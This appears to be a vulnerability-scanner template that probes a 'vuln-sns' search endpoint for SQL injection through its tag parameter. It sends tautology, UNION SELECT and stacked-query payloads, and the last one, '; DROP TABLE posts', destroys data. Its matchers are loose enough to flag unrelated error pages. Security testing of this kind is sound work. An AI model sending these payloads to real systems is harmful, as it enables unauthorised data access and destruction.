id: vuln-sns-search-sql-injection

info:
  name: vuln-sns Search SQL Injection
  author: devin
  severity: high
  description: SQL injection vulnerability in search endpoint via tag parameter
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  metadata:
    max-request: 3
  tags: sqli,search,vuln-sns

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag=test' OR '1'='1' -- "
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "SQL syntax"
          - "near"
          - "MariaDB"
        condition: or
        part: body
        case-insensitive: true
      
      - type: status
        status:
          - 500

  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag=test' UNION SELECT 1,2,3,4,5,6,7 -- "
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "union"
          - "select"
        condition: or
        part: body
        case-insensitive: true

  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag=test'; DROP TABLE posts; -- "
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "drop"
          - "table"
        condition: or
        part: body
        case-insensitive: true
